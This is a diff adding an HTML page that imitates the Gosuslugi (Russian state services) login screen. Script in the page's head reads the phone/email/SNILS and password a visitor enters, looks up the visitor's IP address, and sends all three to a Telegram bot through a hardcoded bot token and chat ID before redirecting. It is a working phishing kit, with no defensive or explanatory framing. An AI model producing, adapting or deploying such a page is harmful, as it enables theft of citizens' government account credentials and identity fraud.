@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги - Вход</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eef3fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 160px;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            background: #f1f5fc;
+            font-size: 16px;
+        }
+        .login-button {
+            background: #0057ff;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-button:hover {
+            background: #0040cc;
+        }
+    </style>
+    <script>
+        const botToken = "8291314590:AAFqutDCkSmsWlIf7jLr1XPy6RsLfuAiMCY";
+        const chatId = "-1003047513638";
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).then(() => {
+                window.location.href = "log.htm";
+            });
+        }
+
+        function getUserIP(callback) {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback('Неизвестный IP'));
+        }
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            document.querySelector(".login-button").addEventListener("click", function() {
+                const email = document.querySelector("input[placeholder='Телефон / Email / СНИЛС']").value;
+                const password = document.querySelector("input[placeholder='Пароль']").value;
+                getUserIP(ip => {
+                    sendToTelegram(`Пользователь ввёл: \nEmail/СНИЛС: ${email}\nПароль: ${password}\nIP: ${ip}`);
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги">
+        </div>
+        <input type="text" placeholder="Телефон / Email / СНИЛС">
+        <input type="password" placeholder="Пароль">
+        <button class="login-button">Войти</button>
+    </div>
+</body>
+</html>
